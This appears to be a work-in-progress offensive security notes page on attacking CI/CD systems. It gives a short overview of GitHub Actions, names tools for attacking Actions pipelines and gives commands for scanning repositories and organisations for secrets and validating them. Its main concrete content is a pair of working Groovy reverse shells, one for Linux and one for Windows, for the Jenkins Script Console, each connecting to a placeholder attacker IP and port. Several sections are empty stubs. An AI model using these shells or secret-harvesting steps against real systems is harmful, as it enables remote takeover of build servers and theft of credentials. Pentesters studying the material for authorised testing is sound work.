---
layout: blank
pagetitle: CI/CD Exploitation [WIP]
---

## Understanding CI/CD

Most of the below relates to GitHub, but the principles apply to pretty much all CICD (Jenkins, Builtkite, CircleCI, GitLab, JFrog)

**Github Actions**
- Github actions are some workflow that is triggered when an event occurs, like a PR/Issue being created or testing a release
  - Defined in `.github/workflows`
- Jobs run inside Runners (usually VMs) or containers  
  - Github can provision these Linux/Windows/MacOS runners, which execute in fresh, isolated VMs
  - These jobs are steps in the workflow that are all executed on the runner
    - These are either actions that run or shell scripts that are executed
    - The first step could build the app, and the second could test it
  - Multiple jobs can be dependent on one another, waiting for the first job to finish before beginning the second
    - Alternatively, a matrix of jobs will all execute in parallel

**Automated Actions abuse**
- Use [Gato](https://github.com/praetorian-inc/gato) for enumerating/attacking Github actions
- Use [Glato](https://github.com/praetorian-inc/glato) for enumerating/attacking GitLab actions

## Github Enumeration

**Identifying Secrets**
- [Titus](https://github.com/praetorian-inc/titus/releases) can be used to enumerate secrets of remote repos and organizations
  - Scan a directory: `titus scan {path}`
  - Scan a GH/GL directory: `titus scan {repo_link} --git --validate --output {output_db}`
    - `--git` scans previous commits, which is slower but covers deleted passwords
    - `--validate` will actually validate the secrets, which can help a lot with AWS keys for example
  - Scan a GH/GL Organization: `titus {github/gitlab} --org {org_name}`
    - If it's private, supply a pat with `--token {token}`
    - Can scan all repos owned by a user with `--user {username}`
  - Report with `titus report --datastore {db_file}`
- [NoseyParker](https://github.com/praetorian-inc/noseyparker.git) can also be used as a backup here

**Identifying Self-Hosted Runners**
- 


## Github Exploitation

**Compromising Self-Hosted Runners**

## Service-Specific Exploitation

**Jenkins**
- Can run arbitrary commands via Apache Groovy scripts in the Script Console at `/script`
- Linux reverse shell:

```sh
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{kali_ip}/{kali_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Windows reverse shell:

```sh
String host="{kali_ip}";
int port={kali_port};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**JFrog**

